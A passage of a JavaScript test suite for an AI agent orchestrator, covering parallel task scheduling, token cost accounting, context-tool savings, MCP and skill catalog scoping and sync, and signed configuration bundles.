    assert.equal(recap.understanding.confidence, 0.35)
    assert.equal(recap.understanding.rationale, "unclear scope")
  })

  it("renders a table the Execution Manager can paste verbatim", () => {
    const created_run = run("Generate API documentation")
    next(created_run.id)
    record(created_run.id, "documentation", { status: "ok", confidence: 0.93, summary: "docs", files: ["README.md"] })

    const recap = report(created_run.id)
    assert.match(recap.table, /\| Phase \| Capability \| Model \| Attempts \| Confidence \| Time \|/)
    assert.match(recap.table, /omniroute\/github\/claude-opus-5/)
    assert.match(recap.table, /0\.93/)
    assert.equal(recap.totals.nodes, 1)
  })
})

// ---------------------------------------------------------------------------

describe("parallel execution", () => {
  it("puts everything that only reads the build output in one wave", () => {
    const { capabilities, strategy } = orchestrate("Fix the failing unit tests in the billing module")
    const graph = buildGraph(config, { capabilities, strategy })
    const shape = waves(graph).map((wave) => wave.sort())

    assert.deepEqual(shape[0], ["implementation"])
    assert.deepEqual(shape[1], ["architecture", "security", "testing"])
    assert.equal(shape.length, 2, "verification and validation must not be stacked into separate waves")
  })

  it("wires reviews to the build, not to the tests that run beside them", () => {
    const created_run = run("Refactor the authentication module for clarity")
    const build = created_run.graph.nodes.find((node) => node.capability === "refactoring")
    for (const validator of created_run.graph.nodes.filter((node) => node.phase === "validate")) {
      assert.ok(validator.dependsOn.includes(build.id), `${validator.capability} should depend on the build`)
      assert.ok(
        !validator.dependsOn.some((dep) => created_run.graph.nodes.find((n) => n.id === dep)?.phase === "verify"),
        `${validator.capability} must not wait for verification`,
      )
    }
  })

  it("hands the whole wave to the Execution Manager in a single dispatch", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "fixed" })

    const wave = next(created_run.id)
    assert.equal(wave.dispatch.length, 3)
    assert.deepEqual(wave.dispatch.map((node) => node.capability).sort(), ["architecture", "security", "testing"])
    assert.equal(wave.maxParallel, config.workflows.strategies.dag.max_parallel)
  })

  it("keeps serial capabilities alone in their own wave", () => {
    const { capabilities, strategy } = orchestrate("Migrate the database schema to the new billing model")
    const graph = buildGraph(config, { capabilities, strategy })
    const migration = graph.nodes.find((node) => node.capability === "migration")
    assert.equal(graph.layers[migration.layer].length, 1)
  })

  it("invalidates the whole downstream subgraph when the build is reopened", () => {
    const { capabilities, strategy } = orchestrate("Fix the failing unit tests in the billing module")
    const graph = buildGraph(config, { capabilities, strategy })
    const build = graph.nodes.find((node) => node.capability === "implementation")
    for (const node of graph.nodes) node.status = "done"
    graph.nodes.find((node) => node.capability === "testing").status = "running"

    const affected = resetDownstream(graph, [build.id], "security")
    assert.deepEqual(affected.sort(), ["architecture", "security", "testing"])
    assert.equal(graph.nodes.find((node) => node.capability === "architecture").status, "pending")
    assert.equal(graph.nodes.find((node) => node.capability === "testing").stale, true)
  })

  it("discards the result of a worker whose build was reopened underneath it", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "fixed" })
    next(created_run.id)

    const reopen = record(created_run.id, "security", {
      status: "ok",
      confidence: 0.9,
      summary: "leak",
      verdict: "fail",
      findings_blocking: 1,
    })
    assert.ok(
      reopen.decisions.some((decision) => decision.action === "reopen_build"),
      `expected the build to be reopened, got ${JSON.stringify(reopen.decisions)}`,
    )

    // testing was still running when the build was reopened
    const late = record(created_run.id, "testing", { status: "ok", confidence: 0.95, summary: "green" })
    const discarded = late.decisions.find((decision) => decision.action === "discarded")
    assert.ok(discarded, `expected the stale result to be discarded, got ${JSON.stringify(late.decisions)}`)
    assert.equal(discarded.node, "testing")
    assert.equal(late.nodeStatus, "pending")
  })

  it("refuses a phase dependency that points forward in time", () => {
    assert.throws(
      () =>
        validateConfig({
          ...config,
          workflows: {
            ...config.workflows,
            execution: { ...config.workflows.execution, phase_depends_on: { ...config.workflows.execution.phase_depends_on, build: ["validate"] } },
          },
        }),
      /depends on "validate", which does not run earlier/,
    )
  })
})

// ---------------------------------------------------------------------------

describe("cost model", () => {
  it("bills input and output at the declared per-million rates", () => {
    // opus-5: $15 in / $75 out per Mtok.
    const cost = costOf(config, "opus-5", { inputTokens: 1_000_000, outputTokens: 1_000_000 })
    assert.equal(cost, 90)
  })

  it("bills cached input at the reduced multiplier", () => {
    const plain = costOf(config, "opus-5", { inputTokens: 1_000_000 })
    const cached = costOf(config, "opus-5", { cachedTokens: 1_000_000 })
    assert.equal(plain, 15)
    assert.equal(cached, 1.5)
  })

  it("charges nothing for a pool with no declared price", () => {
    assert.equal(costOf(config, "does-not-exist", { inputTokens: 5_000_000 }), 0)
  })

  it("sums without floating point drift", () => {
    assert.equal(sum([0.1, 0.2]), 0.3)
    assert.equal(sum([]), 0)
  })

  it("reads usage from both snake_case and camelCase results", () => {
    assert.deepEqual(usageOf({ tokens_in: 10, tokens_out: 5 }), {
      inputTokens: 10,
      outputTokens: 5,
      cachedTokens: 0,
      totalTokens: 15,
      metered: true,
    })
    assert.equal(usageOf({ inputTokens: 7 }).inputTokens, 7)
    assert.equal(usageOf({}).metered, false)
  })

  it("classifies budget state against the warning threshold", () => {
    assert.equal(budgetState(10, 0).state, "none")
    assert.equal(budgetState(10, 100, 0.8).state, "ok")
    assert.equal(budgetState(85, 100, 0.8).state, "warn")
    assert.equal(budgetState(120, 100, 0.8).state, "over")
  })

  it("exposes declared budgets and currency", () => {
    const limits = budgets(config)
    assert.equal(limits.currency, "USD")
    assert.equal(currency(config), "USD")
    assert.ok(limits.monthlyTotal > 0)
    assert.ok(limits.perRepoMonthly > 0)
    assert.ok(limits.warnAt > 0 && limits.warnAt < 1)
  })

  it("publishes a price list covering every pool", () => {
    const prices = priceTable(config)
    assert.equal(prices.length, Object.keys(config.providers.pools).length)
    assert.ok(prices.some((price) => price.pool === "opus-5" && price.priced))
  })

  it("attributes cost to the node that spent it, across retries", () => {
    const created_run = run("Fix the failing billing tests")
    const dispatch = next(created_run.id)
    const first = dispatch.dispatch[0]

    record(created_run.id, first.nodeId, { status: "ok", confidence: 0.9, tokens_in: 1_000_000, tokens_out: 200_000 })
    const recap = report(created_run.id)
    const step = recap.steps.find((candidate) => candidate.node === first.nodeId)

    assert.ok(step.cost > 0, "an executed step must carry a cost")
    assert.equal(step.usage.totalTokens, 1_200_000)
    assert.equal(recap.totals.cost, step.cost)
    assert.equal(recap.totals.currency, "USD")
    assert.equal(recap.totals.metered, true)
    assert.ok(recap.models[0].cost > 0)
    assert.match(recap.table, /\| Cost \|/)
  })

  it("reports no cost when a worker does not report usage", () => {
    const created_run = run("Rename a variable in the logger")
    const dispatch = next(created_run.id)
    record(created_run.id, dispatch.dispatch[0].nodeId, { status: "ok", confidence: 0.9 })
    const recap = report(created_run.id)
    assert.equal(recap.totals.cost, 0)
    assert.equal(recap.totals.metered, false)
    assert.match(recap.table, /\| — \|/)
  })
})

// ---------------------------------------------------------------------------

describe("observed token accounting", () => {
  function message(overrides = {}) {
    const { tokens, ...rest } = overrides
    return {
      type: "message.updated",
      properties: {
        info: {
          id: `msg_${Math.random().toString(36).slice(2)}`,
          role: "assistant",
          mode: "caao-implementation--opus-5",
          providerID: "omniroute",
          modelID: "github/claude-opus-5",
          cost: 1.25,
          time: { created: Date.now() - 1000, completed: Date.now() },
          tokens: { input: 1000, output: 400, reasoning: 50, cache: { read: 200, write: 0 }, ...tokens },
          ...rest,
        },
      },
    }
  }

  it("bills only completed assistant messages", () => {
    assert.equal(observationFrom({ type: "session.updated" }), null)
    assert.equal(observationFrom(message({ role: "user" })), null)
    assert.equal(observationFrom(message({ time: { created: Date.now() } })), null, "a streaming partial is not billable")
    assert.equal(observationFrom(message({ tokens: { input: 0, output: 0, cache: { read: 0 } } })), null)
    assert.ok(observationFrom(message()))
  })

  it("folds cache reads into the input figure it bills", () => {
    const observed = observationFrom(message())
    assert.equal(observed.usage.inputTokens, 1200, "1000 fresh + 200 read from cache")
    assert.equal(observed.usage.cachedTokens, 200)
    assert.equal(observed.usage.outputTokens, 400)
    assert.equal(observed.usage.totalTokens, 1600)
    assert.equal(observed.usage.calls, 1)
    assert.equal(observed.usage.metered, true)
    assert.equal(observed.model, "omniroute/github/claude-opus-5")
    assert.equal(observed.providerCost, 1.25)
    assert.equal(observed.agent, "caao-implementation--opus-5")
    assert.equal(
      observationFrom(message({ agent: "caao-testing--opus-5" })).agent,
      "caao-testing--opus-5",
      "opencode writes the agent name to both fields; the newer one wins",
    )
  })

  it("adds and subtracts usage without ever going negative", () => {
    const a = observationFrom(message()).usage
    const doubled = addUsage(a, a)
    assert.equal(doubled.totalTokens, 3200)
    assert.equal(doubled.calls, 2)
    const back = subtractUsage(doubled, a)
    assert.equal(back.totalTokens, 1600)
    assert.equal(subtractUsage(a, doubled).totalTokens, 0, "an over-subtraction clamps at zero")
    assert.equal(subtractUsage(a, a).metered, false, "a zero delta is not a metered attempt")
  })

  it("maps an answering model back to the pool that priced it", () => {
    assert.equal(poolForModel(config, config.providers.pools["opus-5"].model), "opus-5")
    assert.equal(poolForModel(config, "someone/else"), null)
    assert.equal(poolForModel(config, null), null)
  })

  it("attributes a message to the running task whose agent produced it", () => {
    const now = Date.parse("2024-05-01T10:00:00.000Z")
    const graph = {
      nodes: [
        { id: "n1", status: "running", agent: "caao-implementation--opus-5", startedAt: "2024-05-01T09:00:00.000Z", usage: { calls: 2 } },
        { id: "n2", status: "running", agent: "caao-implementation--opus-5", startedAt: "2024-05-01T09:30:00.000Z", usage: { calls: 0 } },
        { id: "n3", status: "running", agent: "caao-testing--opus-5", startedAt: "2024-05-01T09:00:00.000Z", usage: { calls: 0 } },
        { id: "n4", status: "done", agent: "caao-review--kimi-code", endedAt: "2024-05-01T09:59:30.000Z" },
        { id: "n5", status: "done", agent: "caao-research--opus-5", endedAt: "2024-05-01T08:00:00.000Z" },
      ],
    }

    const pick = (agent, model = null) => attributionTarget({ graph }, { agent, model }, { now })?.id ?? null

    assert.equal(pick("caao-implementation--opus-5"), "n2", "identical parallel workers split by who has been billed least")
    assert.equal(pick("caao-testing--opus-5"), "n3")
    assert.equal(pick("caao-review--kimi-code"), "n4", "a late final message still belongs to the task that just finished")
    assert.equal(pick("caao-research--opus-5"), null, "an old finished task no longer absorbs stray messages")
    assert.equal(pick("caao"), null, "the manager's own thinking belongs to no task")
  })

  it("falls back to the model when the agent name is unknown", () => {
    const graph = { nodes: [{ id: "n1", status: "running", agent: "whatever", provider: { model: "omniroute/x" }, usage: { calls: 0 } }] }
    assert.equal(attributionTarget({ graph }, { agent: "unrecognised", model: "omniroute/x" })?.id, "n1")
  })

  it("bills an observed message to the task in flight", () => {
    const created_run = run("Fix the failing billing tests")
    const dispatch = next(created_run.id)
    const first = dispatch.dispatch[0]

    const result = ingestUsage(
      observationFrom(message({ mode: first.agent, modelID: "github/claude-opus-5" })),
      { runId: created_run.id },
    )

    assert.equal(result.status, "billed")
    assert.equal(result.scope, "task")
    assert.equal(result.node, first.nodeId)
    assert.ok(result.cost > 0, "the company price list turns observed tokens into money")

    const recap = report(created_run.id)
    const step = recap.steps.find((candidate) => candidate.node === first.nodeId)
    assert.equal(step.usage.inputTokens, 1200)
    assert.equal(step.usage.outputTokens, 400)
    assert.equal(recap.totals.metered, true)
    assert.ok(recap.totals.cost > 0, "a run costs what the provider actually charged, with no worker cooperation")
  })

  it("never bills the same message twice", () => {
    const created_run = run("Add pagination to the orders endpoint")
    const first = next(created_run.id).dispatch[0]
    const observed = observationFrom(message({ mode: first.agent }))

    assert.equal(ingestUsage(observed, { runId: created_run.id }).status, "billed")
    assert.equal(ingestUsage(observed, { runId: created_run.id }).status, "duplicate")
    assert.equal(report(created_run.id).steps.find((s) => s.node === first.nodeId).usage.calls, 1)
  })

  it("charges the orchestrator's own thinking to the run, not to a task", () => {
    const created_run = run("Refactor the payment gateway")
    const result = ingestUsage(observationFrom(message({ mode: "caao" })), { runId: created_run.id })

    assert.equal(result.scope, "orchestrator")
    assert.equal(result.node, null)

    const recap = report(created_run.id)
    assert.equal(recap.orchestrator.usage.totalTokens, 1600)
    assert.ok(recap.totals.orchestratorCost > 0)
    assert.equal(recap.totals.taskCost, 0, "no task ran, yet the run is not free")
    assert.equal(recap.totals.cost, recap.totals.orchestratorCost)
  })

  it("keeps reported and observed usage from being counted twice", () => {
    const created_run = run("Tidy the logging helpers")
    const first = next(created_run.id).dispatch[0]

    ingestUsage(observationFrom(message({ mode: first.agent })), { runId: created_run.id })
    record(created_run.id, first.nodeId, { status: "ok", confidence: 0.9 })

    const step = report(created_run.id).steps.find((candidate) => candidate.node === first.nodeId)
    assert.equal(step.usage.totalTokens, 1600, "recording a result must not add a second copy of the observed usage")
  })

  it("ignores an observation it cannot place", () => {
    assert.equal(ingestUsage(null).status, "ignored")
    assert.equal(ingestUsage(observationFrom(message()), { runId: "no-such-run" }).status, "ignored")
  })
})

// ---------------------------------------------------------------------------

describe("context tool savings", () => {
  const headroom = {
    id: "headroom",
    savings: {
      tools: ["headroom_compress"],
      metadata: { before: ["original_tokens"], after: ["compressed_tokens"], saved: ["tokens_saved"] },
      pattern: "saved\\s+(?<saved>\\d+)\\s+tokens",
    },
  }

  it("recognises its own tools through opencode's MCP namespacing", () => {
    assert.equal(toolBelongsTo(headroom, "headroom_compress"), true)
    assert.equal(toolBelongsTo(headroom, "headroom_headroom_compress"), true, "opencode prefixes MCP tools with the server id")
    assert.equal(toolBelongsTo(headroom, "headroom_stats"), true, "the server id alone still identifies the owner")
    assert.equal(toolBelongsTo(headroom, "grep"), false)
  })

  it("reads the numbers the tool published in its metadata", () => {
    const observed = extractSavings(headroom, {
      tool: "headroom_compress",
      output: "",
      metadata: { original_tokens: 12_000, compressed_tokens: 3_000 },
    })
    assert.equal(observed.reported, true)
    assert.equal(observed.tokensBefore, 12_000)
    assert.equal(observed.tokensAfter, 3_000)
    assert.equal(observed.tokensSaved, 9_000, "a saving nobody stated is derived, not invented")
  })

  it("falls back to the declared pattern in the tool's own output", () => {
    const observed = extractSavings(headroom, { tool: "headroom_compress", output: "compressed context, saved 4200 tokens" })
    assert.equal(observed.reported, true)
    assert.equal(observed.tokensSaved, 4200)
  })

  it("counts a silent call instead of estimating one", () => {
    const observed = extractSavings(headroom, { tool: "headroom_compress", output: "done" })
    assert.equal(observed.reported, false)
    assert.equal(observed.tokensSaved, null, "unknown is not zero")
  })

  it("finds the catalog entry that owns a tool", () => {
    const tools = catalog(config).contextTools
    assert.equal(ownerOf(tools, "headroom_compress")?.id, "headroom")
    assert.equal(ownerOf(tools, "query_graph")?.id, "graphify")
    assert.equal(ownerOf(tools, "read"), null)
  })

  it("records what a compression tool saved on the run that used it", () => {
    const created_run = run("Summarise the incident timeline")
    const result = recordContextSavings(
      { tool: "headroom_compress", output: "", metadata: { original_tokens: 20_000, compressed_tokens: 5_000 } },
      { runId: created_run.id, pool: "opus-5" },
    )

    assert.equal(result.status, "recorded")
    assert.equal(result.tokensSaved, 15_000)
    assert.ok(result.costSaved > 0, "tokens the model never read are money never spent")

    const silent = recordContextSavings({ tool: "headroom_compress", output: "ok" }, { runId: created_run.id })
    assert.equal(silent.calls, 2)
    assert.equal(silent.reportedCalls, 1, "the silent call is visible as unmeasured, not as zero saving")
    assert.equal(silent.tokensSaved, 15_000)

    const recap = report(created_run.id)
    assert.equal(recap.totals.tokensSaved, 15_000)
    assert.equal(recap.contextTools[0].id, "headroom")
  })

  it("ignores a tool no catalog entry claims", () => {
    assert.equal(recordContextSavings({ tool: "bash", output: "" }).status, "ignored")
  })

  it("aggregates savings across the fleet", () => {
    const created_run = run("Trace the billing regression")
    recordContextSavings(
      { tool: "headroom_compress", output: "", metadata: { original_tokens: 10_000, compressed_tokens: 2_000 } },
      { runId: created_run.id },
    )
    const runs = [JSON.parse(readFileSync(runPath(created_run.id), "utf8"))]
    const [tool] = byContextTool(runs)

    assert.equal(tool.key, "headroom")
    assert.equal(tool.tokensSaved, 8_000)
    assert.equal(tool.runs, 1)
    assert.equal(tool.unreportedCalls, 0)
    assert.equal(tool.ratio, 0.8, "the tool removed 80% of what it was given")
    assert.equal(overview(config, runs).contextTools[0].key, "headroom")
    assert.equal(overview(config, runs).totals.tokensSaved, 8_000)
  })
})

// ---------------------------------------------------------------------------

describe("tool diagnostics", () => {
  it("resolves a command against PATH without running it", () => {
    assert.ok(resolveExecutable(process.execPath), "an absolute path resolves to itself")
    assert.equal(resolveExecutable("definitely-not-a-real-binary-xyz"), null)
    assert.equal(resolveExecutable(""), null)
  })

  it("checks every tool this machine should be running", () => {
    const report = diagnose(config, { repo: "acme/billing-service" })

    assert.ok(report.totals.checked > 0)
    assert.equal(report.totals.checked, report.checks.length)
    assert.equal(report.ok, report.totals.broken === 0)
    assert.ok(report.checks.every((check) => ["ok", "broken"].includes(check.status)))
    assert.ok(report.checks.every((check) => Array.isArray(check.problems)))

    const graphify = report.checks.find((check) => check.id === "graphify")
    assert.equal(graphify.kind, "context_tool")
    assert.equal(graphify.transport, "local")
    assert.ok(graphify.install, "a broken tool must say how to install it")
  })

  it("explains why a tool does not apply here instead of calling it broken", () => {
    const report = diagnose(config, { repo: "acme/unrelated" })
    assert.ok(report.skipped.length > 0)
    assert.ok(report.skipped.every((entry) => entry.reason))
    assert.ok(report.checks.every((check) => !report.skipped.some((entry) => entry.id === check.id)))
  })

  it("reports a missing binary and a missing environment variable separately", () => {
    const report = diagnose(config, { repo: "acme/billing-service", env: {} })
    const github = report.checks.find((check) => check.id === "github")
    assert.equal(github.status, "broken")
    assert.ok(github.problems.some((line) => line.includes("GITHUB_TOKEN")))
  })

  it("renders a report an operator can act on", () => {
    const text = formatDiagnostics(diagnose(config, { repo: "acme/billing-service" }))
    assert.match(text, /CAAO diagnostics/)
    assert.match(text, /graphify/)
  })
})

// ---------------------------------------------------------------------------

describe("repository attribution", () => {
  it("derives an owner/name slug from any remote form", () => {
    assert.equal(repoSlug("git@github.com:acme/billing-service.git"), "acme/billing-service")
    assert.equal(repoSlug("https://github.com/acme/billing-service.git"), "acme/billing-service")
    assert.equal(repoSlug("https://github.com/acme/billing-service"), "acme/billing-service")
    assert.equal(repoSlug(""), null)
    assert.equal(repoSlug(undefined), null)
  })

  it("stores the repository, branch and actor on the run", () => {
    const created_run = run("Fix the billing tests", { repo: "acme/billing-service", branch: "fix/tests", actor: "dev@acme.dev" })
    assert.equal(created_run.repo, "acme/billing-service")
    assert.equal(created_run.branch, "fix/tests")
    assert.equal(created_run.actor, "dev@acme.dev")
    assert.equal(report(created_run.id).repo, "acme/billing-service")
  })
})

// ---------------------------------------------------------------------------

describe("fleet analytics", () => {
  function fleet() {
    const a = run("Fix the failing billing tests", { repo: "acme/billing-service", actor: "ann@acme.dev" })
    const b = run("Add pagination to the orders endpoint", { repo: "acme/orders-api", actor: "bob@acme.dev" })
    const first = next(a.id).dispatch[0]
    record(a.id, first.nodeId, { status: "ok", confidence: 0.9, tokens_in: 500_000, tokens_out: 100_000 })
    return [loadRunFile(a.id), loadRunFile(b.id)]
  }

  function loadRunFile(id) {
    return JSON.parse(readFileSync(runPath(id), "utf8"))
  }

  it("summarizes a run into dashboard-sized facts", () => {
    const [first] = fleet()
    const summary = summarize(first)
    assert.equal(summary.repo, "acme/billing-service")
    assert.equal(summary.actor, "ann@acme.dev")
    assert.ok(summary.nodes > 0)
    assert.ok(summary.done >= 1)
    assert.ok(summary.cost > 0)
    assert.ok(summary.progress > 0 && summary.progress <= 1)
    assert.ok(summary.waves >= 1)
  })

  it("segments totals by repository, model, capability and actor", () => {
    const runs = fleet()
    const data = overview(config, runs)

    assert.equal(data.totals.runs, 2)
    assert.ok(data.totals.cost > 0)
    assert.equal(data.repos.length, 2)
    assert.ok(data.repos.every((repo) => repo.budget.state !== undefined))
    assert.deepEqual(data.actors.map((actor) => actor.key).sort(), ["ann@acme.dev", "bob@acme.dev"])
    assert.ok(byModel(runs).length >= 1)
    assert.ok(byCapability(runs).length >= 1)
    assert.equal(data.currency, "USD")
  })

  it("narrows every figure to one repository when asked", () => {
    const runs = fleet()
    const scoped = overview(config, runs, { repo: "acme/orders-api" })
    assert.equal(scoped.totals.runs, 1)
    assert.equal(scoped.repos.length, 1)
    assert.equal(scoped.repos[0].key, "acme/orders-api")
  })

  it("produces a contiguous daily series with no gaps", () => {
    const series = daily(fleet().map(summarize), 7)
    assert.equal(series.length, 7)
    assert.ok(series.every((day) => /^\d{4}-\d{2}-\d{2}$/.test(day.key)))
    assert.ok(series.at(-1).runs >= 2, "today's bucket holds the runs just created")
  })

  it("lists repositories for the dashboard switcher", () => {
    const repos = repositories(fleet())
    assert.deepEqual(repos.map((repo) => repo.key).sort(), ["acme/billing-service", "acme/orders-api"])
  })

  it("tolerates legacy run files with no cost or repository fields", () => {
    const legacy = { id: "legacy", createdAt: "2020-01-01T00:00:00.000Z", request: "old", status: "complete", graph: { nodes: [] } }
    const summary = summarize(legacy)
    assert.equal(summary.project, "unattributed")
    assert.equal(summary.cost, 0)
    assert.equal(overview(config, [legacy]).totals.runs, 1)
  })
})

// ---------------------------------------------------------------------------

describe("why this DAG", () => {
  it("replays the causal chain from sentence to model", () => {
    const created_run = run("Refactor the payment gateway and add tests", { repo: "acme/billing-service" })
    const why = explain(created_run, config)

    assert.equal(why.runId, created_run.id)
    assert.ok(why.headline.includes(created_run.request))

    const stages = why.steps.map((step) => step.stage)
    assert.ok(stages.includes("understanding"))
    assert.ok(stages.some((stage) => stage.startsWith("policy:")))
    assert.ok(stages.includes("topology"))
    assert.ok(stages.includes("routing"))
    assert.deepEqual(
      why.steps.map((step) => step.step),
      why.steps.map((_, index) => index + 1),
      "steps must be numbered contiguously so the UI can render a timeline",
    )
  })

  it("names the policy that added each capability, with its declared reason", () => {
    const created_run = run("Fix a login bug in the OAuth handler", { touches: ["auth"] })
    const why = explain(created_run, config)
    const policies = why.steps.filter((step) => step.stage.startsWith("policy:"))
    assert.ok(policies.length > 0)
    assert.ok(policies.every((step) => typeof step.policy === "string" && step.policy.length > 0))
    assert.ok(policies.every((step) => typeof step.summary === "string"))
  })

  it("explains the wave structure from declared phase dependencies", () => {
    const created_run = run("Refactor the payment gateway and add tests")
    const topology = explain(created_run, config).steps.find((step) => step.stage === "topology")
    assert.ok(topology.waves.length >= 1)
    assert.ok(topology.detail.some((line) => line.includes("workflows.yaml")))
    assert.ok(topology.waves.every((wave) => wave.nodes.every((node) => node.capability)))
  })

  it("gives every task a model and a reason for that model", () => {
    const created_run = run("Refactor the payment gateway and add tests")
    const routing = explain(created_run, config).steps.find((step) => step.stage === "routing")
    assert.ok(routing.bindings.length > 0)
    assert.ok(routing.bindings.every((binding) => binding.model && binding.why.length > 0))
  })

  it("states the boundary conditions that would have produced a different plan", () => {
    const created_run = run("Fix a typo in the changelog")
    const notes = counterfactuals(created_run)
    assert.ok(notes.length >= 3)
    assert.ok(notes.some((note) => note.includes("confidence") || note.includes("Confidence")))
  })
})

// ---------------------------------------------------------------------------

describe("central MCP and skill catalog", () => {
  it("annotates every entry with its scope and required environment", () => {
    const listing = catalog(config)
    assert.ok(listing.mcp.length > 0)
    assert.ok(listing.skills.length > 0)
    assert.deepEqual(listing.contextTools.map((entry) => entry.id), ["caveman", "headroom", "graphify"])
    assert.ok(listing.mcp.every((entry) => typeof entry.scopeLabel === "string"))

    const github = listing.mcp.find((entry) => entry.id === "github")
    assert.deepEqual(github.requiredEnv, ["GITHUB_TOKEN"])
    assert.deepEqual(listing.mcp.find((entry) => entry.id === "internal-docs").requiredEnv, ["ACME_DOCS_TOKEN"])
    assert.equal(listing.totals.mcp, listing.mcp.length)
  })

  it("matches scopes by repository and by team", () => {
    assert.equal(matchesScope("all", {}), true)
    assert.equal(matchesScope({ repos: ["acme/billing-service"] }, { repo: "acme/billing-service" }), true)
    assert.equal(matchesScope({ repos: ["acme/billing-service"] }, { repo: "acme/orders-api" }), false)
    assert.equal(matchesScope({ teams: ["platform"] }, { team: "platform" }), true)
    assert.equal(matchesScope({ teams: ["platform"] }, { team: "payments" }), false)
  })

  it("builds a per-machine manifest and explains every exclusion", () => {
    const manifest = manifestFor(config, { repo: "acme/billing-service", team: "payments" })

    assert.ok(manifest.mcp.some((entry) => entry.id === "github"), "company-wide servers are always included")
    assert.ok(manifest.mcp.some((entry) => entry.id === "postgres-readonly"), "repo-scoped server matches this repository")
    assert.ok(manifest.skills.some((entry) => entry.id === "billing-domain"))
    assert.ok(!manifest.skills.some((entry) => entry.id === "incident-runbook"), "other teams' skills stay out")
    assert.ok(manifest.excluded.mcp.some((entry) => entry.id === "jira" && entry.reason.includes("disabled")))
    assert.ok(manifest.requiredEnv.includes("GITHUB_TOKEN"))
    assert.ok(manifest.contextTools.every((entry) => entry.enabled))
    assert.ok(manifest.opencode.mcp.headroom)
    assert.ok(manifest.opencode.mcp.graphify)
    assert.deepEqual(manifest.opencode.mcp.graphify.command, ["graphify", ".", "--mcp"])
  })

  it("selects company skills for the matching worker capability", () => {
    const skills = skillInstructionsFor(config, "implementation", { repo: "acme/billing-service", team: "payments" })
    assert.ok(skills.some((entry) => entry.id === "acme-code-style"))
    assert.ok(skills.some((entry) => entry.id === "billing-domain"))
    assert.ok(!skills.some((entry) => entry.id === "incident-runbook"))
  })

  it("excludes repo-scoped entries from an unrelated repository", () => {
    const manifest = manifestFor(config, { repo: "acme/website" })
    assert.ok(!manifest.mcp.some((entry) => entry.id === "postgres-readonly"))
    assert.ok(!manifest.skills.some((entry) => entry.id === "billing-domain"))
  })

  it("renders an opencode-shaped mcp block without inventing secrets", () => {
    const block = mcpBlock(manifestFor(config, { repo: "acme/billing-service" }).mcp)
    assert.equal(block.github.type, "local")
    assert.ok(Array.isArray(block.github.command))
    assert.equal(block["internal-docs"].type, "remote")
    assert.equal(block["internal-docs"].url, "https://mcp.internal.acme.dev/docs")
    assert.match(JSON.stringify(block), /\{env:[A-Z_]+\}/, "secrets stay as environment references")
  })

  it("rejects a half-declared catalog entry", () => {
    assert.throws(() => validateCatalog({ mcp: [{ id: "x", kind: "local" }] }), /has no command array/)
    assert.throws(() => validateCatalog({ mcp: [{ id: "y", kind: "remote" }] }), /has no url/)
    assert.throws(() => validateCatalog({ skills: [{ id: "z" }] }), /has no file/)
    assert.throws(() => validateCatalog({ mcp: [{ id: "d", kind: "remote", url: "u" }, { id: "d", kind: "remote", url: "u" }] }), /duplicate/)
    assert.throws(() => validateCatalog({ mcp: [{ id: "__proto__", kind: "local", command: ["x"] }] }), /id .* invalid/)
    assert.throws(() => validateCatalog({ mcp: [{ id: "leak", kind: "remote", url: "https://example.test", headers: { Authorization: "Bearer literal-secret" } }] }), /environment placeholder/)
    assert.throws(() => validateCatalog({ context_tools: [{ id: "bad", category: "compression", mcp: { kind: "local", command: [] } }] }), /no mcp command/)
  })

  it("materialises managed MCP and signed skill content without deleting local MCP", () => {
    const sandbox = mkdtempSync(join(tmpdir(), "caao-catalog-"))
    try {
      writeFileSync(join(sandbox, "opencode.json"), JSON.stringify({ mcp: { personal: { type: "remote", url: "https://personal.test" } } }))
      const scoped = structuredClone(config)
      scoped.catalog.skills.push({
        id: "inline-test",
        title: "Inline test",
        enabled: true,
        scope: "all",
        capabilities: ["testing"],
        file: "skills/inline-test.md",
        content: "# Signed company test guidance",
      })
      const result = syncCatalog(scoped, sandbox, { repo: "acme/billing-service", team: "payments" })
      const runtime = JSON.parse(readFileSync(join(sandbox, "opencode.json"), "utf8"))
      assert.ok(runtime.mcp.personal, "developer-owned MCP must survive catalog sync")
      assert.ok(runtime.mcp.headroom && runtime.mcp.graphify)
      assert.ok(result.skills.includes("skills/inline-test.md"))
      assert.match(readFileSync(join(sandbox, "skills", "inline-test.md"), "utf8"), /Signed company test guidance/)
      assert.match(readFileSync(join(sandbox, "skills", "inline-test.md"), "utf8"), /managed by caao:catalog/)

      scoped.catalog.context_tools.find((entry) => entry.id === "headroom").enabled = false
      scoped.catalog.skills.find((entry) => entry.id === "inline-test").enabled = false
      syncCatalog(scoped, sandbox, { repo: "acme/billing-service", team: "payments" })
      const disabled = JSON.parse(readFileSync(join(sandbox, "opencode.json"), "utf8"))
      assert.equal(disabled.mcp.headroom, undefined, "disabled managed MCP must be removed")
      assert.ok(disabled.mcp.personal)
      assert.equal(existsSync(join(sandbox, "skills", "inline-test.md")), false, "disabled managed skill content must be removed")
    } finally {
      rmSync(sandbox, { recursive: true, force: true })
    }
  })

  it("refuses to overwrite a developer-owned skill", () => {
    const sandbox = mkdtempSync(join(tmpdir(), "caao-catalog-"))
    try {
      writeFileSync(join(sandbox, "opencode.json"), "{}", "utf8")
      const scoped = structuredClone(config)
      scoped.catalog.skills.push({
        id: "collision-test",
        title: "Collision test",
        enabled: true,
        scope: "all",
        file: "skills/personal.md",
        content: "# Company guidance",
      })
      const personal = join(sandbox, "skills", "personal.md")
      mkdirSync(join(sandbox, "skills"), { recursive: true })
      writeFileSync(personal, "# My personal guidance\n", "utf8")

      assert.throws(() => syncCatalog(scoped, sandbox), /refusing to overwrite developer-owned skill/)
      assert.equal(readFileSync(personal, "utf8"), "# My personal guidance\n")
    } finally {
      rmSync(sandbox, { recursive: true, force: true })
    }
  })
})

describe("centralised configuration distribution", () => {
  const keys = generateSigningKeys()
  const bundle = buildBundle(CAAO_HOME, { channel: "stable" })
  const signature = signBundle(bundle, keys.privateKey)

  it("carries exactly the files that decide behaviour, and no run data", () => {
    assert.deepEqual(Object.keys(bundle.files).sort(), MANAGED_FILES.filter((f) => bundle.files[f] !== undefined).sort())
    for (const required of ["capabilities.yaml", "providers.yaml", "policies.yaml", "workflows.yaml"]) {
      assert.ok(bundle.files[required], `${required} must be distributed`)
    }
    assert.ok(!("agent" in bundle.files), "agents are regenerated locally, never shipped")
